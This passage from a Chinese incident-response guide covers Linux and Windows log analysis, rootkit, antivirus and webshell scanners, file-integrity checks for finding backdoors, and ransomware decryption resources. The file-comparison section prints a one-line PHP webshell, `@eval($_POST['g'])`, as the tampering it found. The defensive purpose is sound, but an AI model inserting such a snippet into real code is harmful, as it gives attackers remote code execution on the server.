</tbody>
</table>
<p>日志分析技巧：</p>
<pre><code>1、定位有多少IP在爆破主机的root帐号：    
grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

定位有哪些IP在爆破：
grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c

爆破用户名字典是什么？
grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}'|uniq -c|sort -nr
 
2、登录成功的IP有哪些： 	
grep &quot;Accepted &quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

登录成功的日期、用户名、IP：
grep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 

3、增加一个用户kali日志：
Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001
Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali
, shell=/bin/bash
Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali
#grep &quot;useradd&quot; /var/log/secure 

4、删除用户kali日志：
Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali'
Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'
Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'
# grep &quot;userdel&quot; /var/log/secure

5、su切换用户：
Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)

sudo授权执行:
sudo -l
Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now
</code></pre>
<h3 id="0x02-工具篇-2">0x02 工具篇</h3>
<h4 id="21-rootkit查杀">2.1 Rootkit查杀</h4>
<ul>
<li>
<p>chkrootkit</p>
<p>网址：http://www.chkrootkit.org</p>
<pre><code>使用方法：
wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
tar zxvf chkrootkit.tar.gz
cd chkrootkit-0.52
make sense
#编译完成没有报错的话执行检查
./chkrootkit
</code></pre>
</li>
<li>
<p>rkhunter</p>
<p>网址：http://rkhunter.sourceforge.net</p>
<pre><code>使用方法：
Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz
tar -zxvf rkhunter-1.4.4.tar.gz
cd rkhunter-1.4.4
./installer.sh --install
rkhunter -c
</code></pre>
</li>
</ul>
<h4 id="22-病毒查杀-2">2.2 病毒查杀</h4>
<ul>
<li>
<p>Clamav</p>
<p>网址：<a href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p>
<p>安装方式一：</p>
<pre><code>1、安装 zlib：
wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz 
tar -zxvf  zlib-1.2.7.tar.gz
cd zlib-1.2.7
#安装一下gcc编译环境： yum install gcc
CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/
make &amp;&amp; make install

2、添加用户组 clamav 和组成员 clamav：
groupadd clamav
useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav

3、安装 Clamav
tar –zxvf clamav-0.97.6.tar.gz
cd clamav-0.97.6
./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib
make
make install

4、配置 Clamav
mkdir /opt/clamav/logs
mkdir /opt/clamav/updata
touch /opt/clamav/logs/freshclam.log
touch /opt/clamav/logs/clamd.log
cd /opt/clamav/logs
chown clamav:clamav clamd.log
chown clamav:clamav freshclam.log

5、ClamAV 使用：
 /opt/clamav/bin/freshclam 升级病毒库
./clamscan –h 查看相应的帮助信息
./clamscan -r /home  扫描所有用户的主目录就使用
./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果
</code></pre>
<p>安装方式二：</p>
<pre><code>#安装
yum install -y clamav
#更新病毒库
freshclam
#扫描方法
clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log
clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log
clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log
#扫描并杀毒
clamscan -r  --remove  /usr/bin/bsd-port
clamscan -r  --remove  /usr/bin/
clamscan -r --remove  /usr/local/zabbix/sbin
#查看日志发现
cat /root/usrclamav.log |grep FOUND
</code></pre>
</li>
</ul>
<h4 id="23-webshell查杀">2.3 webshell查杀</h4>
<p>Linux 版：</p>
<pre><code>河马 WebShell 查杀：http://www.shellpub.com
</code></pre>
<h4 id="24-rpm-check-检查">2.4 RPM check 检查</h4>
<p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p>
<pre><code>./rpm -Va &gt; rpm.log
</code></pre>
<p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p>
<pre><code>验证内容中的8个信息的具体内容如下：
		S         文件大小是否改变
		M         文件的类型或文件的权限（rwx）是否被改变
		5         文件MD5校验是否改变（可以看成文件内容是否改变）
		D         设备中，从代码是否改变
		L         文件路径是否改变
		U         文件的属主（所有者）是否改变
		G         文件的属组是否改变
		T         文件的修改时间是否改变
</code></pre>
<p>如果命令被替换了，如果还原回来：</p>
<pre><code>文件提取还原案例：
rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包
mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象
rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下
cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失
</code></pre>
<h4 id="25-linux安全检查脚本">2.5 Linux安全检查脚本</h4>
<p>Github 项目地址：</p>
<p>https://github.com/grayddq/GScan</p>
<p>https://github.com/ppabc/security_check</p>
<p>https://github.com/T0xst/linux</p>
<p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>
<p>#常见的 Webshell 查杀工具</p>
<h3 id="前言">前言</h3>
<p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p>
<p>本文推荐了10款 WebShll 检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种 WebShell 检测能力，比如阿里云、青藤云、safedog 等，本文暂不讨论。</p>
<hr>
<p><strong>1、D盾_Web查杀</strong></p>
<p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的 WebShell 后门行为。</p>
<p>兼容性：只提供 Windows 版本。</p>
<p>工具下载地址：http://www.d99net.net<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002152173.png" alt="" loading="lazy"><br>
<strong>2、百度 WEBDIR+</strong></p>
<p>下一代 WebShell 检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p>
<p>兼容性：提供在线查杀木马，免费开放 API 支持批量检测。</p>
<p>在线查杀地址：https://scanner.baidu.com<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002169145.png" alt="" loading="lazy"><br>
<strong>3、河马</strong></p>
<p>专注 WebShell 查杀研究，拥有海量 WebShell 样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p>
<p>兼容性：支持 Windows、Linux，支持在线查杀。</p>
<p>官方网站：https://www.shellpub.com<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002183565.png" alt="" loading="lazy"><br>
<strong>4、Web Shell Detector</strong></p>
<p>Web Shell Detector 具有 WebShell 签名数据库，可帮助识别高达 99％ 的 WebShell。</p>
<p>兼容性：提供 PHP、Python 脚本，可跨平台，在线检测。</p>
<p>官方网站：http://www.shelldetector.com</p>
<p>github项目地址：https://github.com/emposha/PHP-Shell-Detector<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002202971.png" alt="" loading="lazy"><br>
<strong>5、CloudWalker（牧云）</strong></p>
<p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p>
<p>兼容性：提供 Linux版本，Windows 暂不支持。</p>
<p>在线查杀 https://webshellchop.chaitin.cn</p>
<p>GitHub 项目地址：https://github.com/chaitin/cloudwalker<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002230652.png" alt="" loading="lazy"><br>
<strong>6、Sangfor WebShellKill</strong></p>
<p>Sangfor WebShellKill (网站后门检测工具)是一款 Web 后门专杀工具，不仅支持 WebShell 的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p>
<p>兼容性：支持 Windows、linux</p>
<p>工具下载地址：http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002254319.png" alt="" loading="lazy"><br>
<strong>7、深度学习模型检测 PHP Webshell</strong></p>
<p>一个深度学习 PHP WebShell 查杀引擎 demo，提供在线样本检测。</p>
<p>在线查杀地址：http://webshell.cdxy.me<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002279026.png" alt="" loading="lazy"><br>
<strong>8、PHP Malware Finder</strong></p>
<p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p>
<p>兼容性：提供Linux 版本，Windows 暂不支持。</p>
<p>GitHub 项目地址：https://github.com/jvoisin/php-malware-finder<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002296973.png" alt="" loading="lazy"><br>
<strong>9、findWebshell</strong></p>
<p>这个项目是一款基于 Python 开发的 WebShell 检查工具，可以根据特征码匹配检查任意类型的 WebShell 后门。</p>
<p>GitHub 项目地址：https://github.com/he1m4n6a/findWebshell<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002335566.png" alt="" loading="lazy"><br>
<strong>10、在线 WebShell 查杀工具</strong></p>
<p>在线查杀地址：http://tools.bugscaner.com/killwebshell<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002355640.png" alt="" loading="lazy"></p>
<p>#如何发现隐藏的 Webshell 后门</p>
<h3 id="前言-2">前言：</h3>
<p>如何在百万行代码里发现隐藏的后门？</p>
<p>试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来吗？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。</p>
<p>即使是一款拥有 99.9% 的 Webshell 检出率的检测引擎，依然可能存在 Webshell 绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽 SEO 手法，也很难通过手动检测或工具检测全部识别出来。</p>
<p>最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p>
<p>本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。</p>
<hr>
<p><strong>1、文件 MD5 校验</strong></p>
<p>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个 exe 可执行文件，还有一个文件 md5 值。这个是软件作者在发布软件时，通过 md5 算法计算出该 exe 文件的&quot;特征值&quot;。</p>
<pre><code>下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip
文件 MD5：29285decadbce3918a4f8429ec33df46   WebShellKill.exe
</code></pre>
<p>当用户下载软件时，可以使用相同的校验算法计算下载到 exe 文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的 exe 文件是正确的。如果两个特征值不同，则认为下载到 exe 文件是被篡改过的。</p>
<p>那同理可得，我们可以将所有网站文件计算一次 hash 值保存，当出现应急情况时，重新计算一次 hash 值，并与上次保存的 hash 值进行对比，从而输出新创建的、修改过及删除的文件列表。</p>
<p>文件 hash 值计算：</p>
<pre><code>def md5sum(file):
    m=hashlib.md5()
    if os.path.isfile(file):
        f=open(file,'rb')
        for line in f:
            m.update(line)
        f.close
    else:
        m.update(file)
    return (m.hexdigest())
</code></pre>
<p>对文件进行哈希值重新计算，进行校验对比，测试效果：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002527884.png" alt="" loading="lazy"><br>
如上图，在上传目录新增了一个 evil.php 文件，还有一个被篡改的文件是 low.php 。使用常见的编辑器 Notepad++ 进行对比，可以发现 low.php 文件里被插入了一句话 WebShell。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002548996.png" alt="" loading="lazy"><br>
<strong>2、diff 命令</strong></p>
<p>在 Linux 中，我们经常使用 diff 命令来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p>
<pre><code>diff -c -a -r cms1 cms2
</code></pre>
<p>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现 low.php 文件被篡改过，篡改的内容是 <code>@eval($_POST['g']);</code><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002578294.png" alt="" loading="lazy"><br>
备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上 -q 选项。</p>
<p><strong>3、版本控制工具</strong></p>
<p>版本控制工具，比如说 git，重新上传代码到 git，add+commit+push，然后打开项目，点击 commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。</p>
<p>另外，也可以通过 git diff 用来比较文件之间的不同。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002594567.png" alt="" loading="lazy"><br>
<strong>4、文件对比工具</strong></p>
<p>关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare 和 WinMerge。</p>
<p><strong>Beyond Compare</strong></p>
<p>Beyond Compare 是一套由 Scooter Software 推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p>
<p>下载地址：http://www.scootersoftware.com/download.php</p>
<p>软件使用示例，通过文件夹比较，找出文件夹中的差异内容。</p>
<p>1、双击 Beyond Compare ，打开软件主页，选择文件夹比较。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002619601.png" alt="" loading="lazy"><br>
2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002638210.png" alt="" loading="lazy"><br>
3、双击具体文件，进入代码对比，找到代码差异部分。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002652043.png" alt="" loading="lazy"><br>
<strong>WinMerge</strong></p>
<p>WinMerge 是一款运行于 Windows 系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。</p>
<p>下载地址：https://winmerge.org/downloads/</p>
<p>1、文件 -- 打开，选择文件或文件夹，然后点击进行比较。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002690770.png" alt="" loading="lazy"><br>
2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002695750.png" alt="" loading="lazy"></p>
<p>#勒索病毒自救指南</p>
<h3 id="前言-3">前言</h3>
<p>经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？</p>
<p>第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。</p>
<p>出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。</p>
<p>作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。</p>
<p>本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。</p>
<p><strong>一、勒索病毒搜索引擎</strong></p>
<p>在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。</p>
<figure data-type="image" tabindex="22"><img src="https://jinqipiaopiao.github.io//post-images/1627002779658.png" alt="" loading="lazy"></figure>
<p>这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。</p>
<p>【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒</p>
<p>官网：http://lesuobingdu.360.cn</p>
<p>【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</p>
<p>官网：https://guanjia.qq.com/pr/ls</p>
<p>【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</p>
<p>官网：https://lesuo.venuseye.com.cn</p>
<p>【奇安信】勒索病毒搜索引擎</p>
<p>官网：https://lesuobingdu.qianxin.com</p>
<p>【深信服】勒索病毒搜索引擎</p>
<p>官网：https://edr.sangfor.com.cn/#/information/ransom_search</p>
<hr>
<p><strong>二、勒索软件解密工具集</strong></p>
<p>很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。</p>
<p>【腾讯哈勃】勒索软件专杀工具</p>
<p>官网：https://habo.qq.com/tool</p>
<p>【金山毒霸】勒索病毒免疫工具</p>
<p>官网：http://www.duba.net/dbt/wannacry.html</p>
<p>【火绒】安全工具下载</p>
<p>官网：http://bbs.huorong.cn/forum-55-1.html</p>
<p>【瑞星】解密工具下载</p>
<p>官网：http://it.rising.com.cn/fanglesuo/index.html</p>
<p>【nomoreransom】勒索软件解密工具集</p>
<p>官网：https://www.nomoreransom.org/zh/index.html</p>
<p>【MalwareHunterTeam】勒索软件解密工具集</p>
<p>官网：https://id-ransomware.malwarehunterteam.com</p>
<p>【卡巴斯基】免费勒索解密器</p>
<p>官网：https://noransom.kaspersky.com</p>
<p>【Avast】免费勒索软件解密工具</p>
<p>官网：https://www.avast.com/zh-cn/ransomware-decryption-tools</p>
<p>【Emsisoft】免费勒索软件解密工具</p>
<p>官网：https://www.emsisoft.com/ransomware-decryption-tools/free-download</p>
<p>【GitHub 项目】勒索病毒解密工具收集汇总</p>
<p>官网：https://github.com/jiansiting/Decryption-Tools</p>
<p>#日志分析：</p>
<p>#Windows日志分析</p>
<h3 id="0x01-windows事件日志简介">0x01 Windows事件日志简介</h3>
<p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>
<p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>
<p><strong>系统日志</strong></p>
<pre><code>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。

默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx
</code></pre>
<p><strong>应用程序日志</strong></p>
<pre><code>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 

默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx
</code></pre>
<p><strong>安全日志</strong></p>
<pre><code>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。

默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx
</code></pre>
<p>​	系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。</p>
<h3 id="0x02-审核策略与事件查看器">0X02 审核策略与事件查看器</h3>
<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p>
<p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002984760.png" alt="" loading="lazy"><br>
<strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002989680.png" alt="" loading="lazy"><br>
<strong>查看系统日志方法：</strong></p>
<ol>
<li>
<p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**</p>
</li>
<li>
<p>按 &quot;<strong>Window+R</strong>&quot;，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>”<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627002993979.png" alt="" loading="lazy"></p>
</li>
</ol>
<h3 id="0x03-事件日志分析">0x03 事件日志分析</h3>
<p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p>
<table>
<thead>
<tr>
<th style="text-align:left">事件ID</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">4624</td>
<td>登录成功</td>
</tr>
<tr>
<td style="text-align:left">4625</td>
<td>登录失败</td>
</tr>
<tr>
<td style="text-align:left">4634</td>
<td>注销成功</td>
</tr>
<tr>
<td style="text-align:left">4647</td>
<td>用户启动的注销</td>
</tr>
<tr>
<td style="text-align:left">4672</td>
<td>使用超级用户（如管理员）进行登录</td>
</tr>
<tr>
<td style="text-align:left">4720</td>
<td>创建用户</td>
</tr>
</tbody>
</table>
<p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p>
<table>
<thead>
<tr>
<th style="text-align:left">登录类型</th>
<th>描述</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">2</td>
<td>交互式登录（Interactive）</td>
<td>用户在本地进行登录。</td>
</tr>
<tr>
<td style="text-align:left">3</td>
<td>网络（Network）</td>
<td>最常见的情况就是连接到共享文件夹或共享打印机时。</td>
</tr>
<tr>
<td style="text-align:left">4</td>
<td>批处理（Batch）</td>
<td>通常表明某计划任务启动。</td>
</tr>
<tr>
<td style="text-align:left">5</td>
<td>服务（Service）</td>
<td>每种服务都被配置在某个特定的用户账号下运行。</td>
</tr>
<tr>
<td style="text-align:left">7</td>
<td>解锁（Unlock）</td>
<td>屏保解锁。</td>
</tr>
<tr>
<td style="text-align:left">8</td>
<td>网络明文（NetworkCleartext）</td>
<td>登录的密码在网络上是通过明文传输的，如FTP。</td>
</tr>
<tr>
<td style="text-align:left">9</td>
<td>新凭证（NewCredentials）</td>
<td>使用带/Netonly参数的RUNAS命令运行一个程序。</td>
</tr>
<tr>
<td style="text-align:left">10</td>
<td>远程交互，（RemoteInteractive）</td>
<td>通过终端服务、远程桌面或远程协助访问计算机。</td>
</tr>
<tr>
<td style="text-align:left">11</td>
<td>缓存交互（CachedInteractive）</td>
<td>以一个域用户登录而又没有域控制器可用</td>
</tr>
</tbody>
</table>
<p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p>
<blockquote>
<p>原文链接 ：https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</p>
</blockquote>
<p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p>
<ol>
<li>
<p>在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p>
</li>
<li>
<p>在事件查看器中，单击**“安全”**，查看安全日志；</p>
</li>
<li>
<p>在安全日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p>
<p>4624  --登录成功<br>
4625  --登录失败<br>
4634 -- 注销成功<br>
4647 -- 用户启动的注销<br>
4672 -- 使用超级用户（如管理员）进行登录</p>
</li>
</ol>
<p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003000182.png" alt="" loading="lazy"><br>
案例2：可以利用eventlog事件来查看计算机开关机的记录：</p>
<p>1、在**“开始”<strong>菜单上，依次指向</strong>“所有程序”<strong>、</strong>“管理工具”<strong>，然后单击</strong>“事件查看器”**；</p>
<p>2、在事件查看器中，单击**“系统”**，查看系统日志；</p>
<p>3、在系统日志右侧操作中，点击**“筛选当前日志”**，输入事件ID进行筛选。</p>
<p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>
6005 信息 EventLog 事件日志服务已启动。(开机)<br>
6006 信息 EventLog 事件日志服务已停止。(关机)<br>
6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p>
<p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003004624.png" alt="" loading="lazy"></p>
<h3 id="0x04-日志分析工具">0x04 日志分析工具</h3>
<h4 id="log-parser">Log Parser</h4>
<p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p>
<p>Log Parser 2.2下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=24659</p>
<p>Log Parser 使用示例：https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003009295.png" alt="" loading="lazy"><br>
<strong>基本查询结构</strong></p>
<pre><code>Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;
</code></pre>
<p><strong>使用Log Parser分析日志</strong></p>
<p>1、查询登录成功的事件</p>
<pre><code>登录成功的所有事件
LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;

指定登录时间范围的事件：
LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;'2018-06-19 23:32:11' and TimeGenerated&lt;'2018-06-20 23:34:00' and EventID=4624&quot;

提取登录成功的用户名和IP：
LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\Security.evtx where EventID=4624&quot;

</code></pre>
<p>2、查询登录失败的事件</p>
<pre><code>登录失败的所有事件：
LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;

提取登录失败用户名进行聚合统计：
LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,' ')  as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot; 

</code></pre>
<p>3、系统历史开关机记录：</p>
<pre><code>LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;

</code></pre>
<h4 id="logparser-lizard">LogParser Lizard</h4>
<p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p>
<p>下载地址：http://www.lizard-labs.com/log_parser_lizard.aspx</p>
<p>依赖包：Microsoft .NET Framework 4 .5，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=42642</p>
<p>查询最近用户登录情况：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003014818.png" alt="" loading="lazy"></p>
<h4 id="event-log-explorer">Event Log Explorer</h4>
<p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p>
<p>下载地址：https://event-log-explorer.en.softonic.com/<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003018475.png" alt="" loading="lazy"><br>
参考链接：</p>
<p>Windows日志分析   https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</p>
<p>#Linux日志分析</p>
<h3 id="0x00-前言-2">0x00 前言</h3>
<p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p>
<h3 id="0x01-日志简介">0x01 日志简介</h3>
<p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th style="text-align:center">日志文件</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
